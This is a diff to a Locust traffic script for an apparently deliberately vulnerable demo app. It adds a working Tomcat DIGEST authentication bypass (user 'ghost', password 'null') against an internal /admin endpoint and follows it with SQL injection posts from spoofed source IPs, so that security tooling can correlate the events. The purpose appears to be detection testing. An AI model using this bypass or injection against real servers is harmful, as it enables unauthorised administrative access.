@@ -19,6 +19,12 @@ import random
 import time
 
 from locust import HttpUser, between, task
+from requests.auth import HTTPDigestAuth
+
+# profile-service is reached directly for the /admin DIGEST exploit below:
+# /admin/* is protected by container-managed auth and is NOT exposed through the
+# frontend, so it cannot be driven via the frontend host like the other attacks.
+PROFILE_SERVICE_ADDR = os.environ.get('PROFILE_SERVICE_ADDR', 'http://unguard-profile-service:80')
 
 LOCATION_BASED_IPS = ['177.236.37.155',
                       '49.210.236.225',
@@ -146,6 +152,7 @@ class UnguardUser(HttpUser):
         self.get_sql_golang()
         self.post_sql_login_injection_nodejs()
         self.post_sql_php()
+        self.exploit_digest_auth_bypass()
 
     def post_jndi(self):
         jndi_post = {'language': "en-US",
@@ -208,6 +215,37 @@ class UnguardUser(HttpUser):
 
         # try to remove the like of the admanger account (user ID 1) on the first post (post ID 1).
         self.client.delete("/api/like", params={'postId': [post_id, user_id]}, headers=self.get_random_x_forwarded_for_header())
+        time.sleep(1)
+
+    def exploit_digest_auth_bypass(self):
+        # CVE-2026-43512: authenticate to the DIGEST-protected /admin endpoint as a
+        # NON-EXISTENT user ("ghost") with the literal password "null". On a vulnerable
+        # Tomcat, RealmBase#getDigest does not null-check getPassword(), so it builds
+        # A1 = MD5("ghost:realm:null"); the "null" password then matches and auth is
+        # bypassed (HTTP 200). /admin/* is not exposed through the frontend, so this
+        # hits profile-service directly. requests' HTTPDigestAuth performs the
+        # 401-challenge then the authenticated re-request.
+        #
+        # One attacker identity per episode: the same spoofed source IP carries both
+        # the bypass and a SQL injection, so the two line up in an investigation --
+        # the bypass shows up in profile-service's access log under this IP, while the
+        # SQL injection is flagged by the backend's runtime protection under the same
+        # IP (actor). That ties the auth bypass to a real security finding.
+        attacker = self.get_random_x_forwarded_for_header()
+        exploit_headers = {**attacker, 'User-Agent': 'cve-2026-43512-exploit'}
+
+        self.client.get(
+            f"{PROFILE_SERVICE_ADDR}/admin/stats",
+            auth=HTTPDigestAuth('ghost', 'null'),
+            headers=exploit_headers,
+            name='/admin/stats [cve-2026-43512]',
+        )
+
+        # Follow-through from the same source IP: a SQL injection the backend flags.
+        # Seed a bio first so the malicious payload drives an UPDATE (the flagged sink).
+        user = self.get_running_username()
+        self.client.post(f"/api/user/{user}/bio", json={'bioText': 'Hello World!'}, headers=attacker)
+        self.client.post(f"/api/user/{user}/bio", json={'bioText': random.choice(SQL_CMDS_BIO)}, headers=attacker)
         time.sleep(1)
 
     def on_start(self):
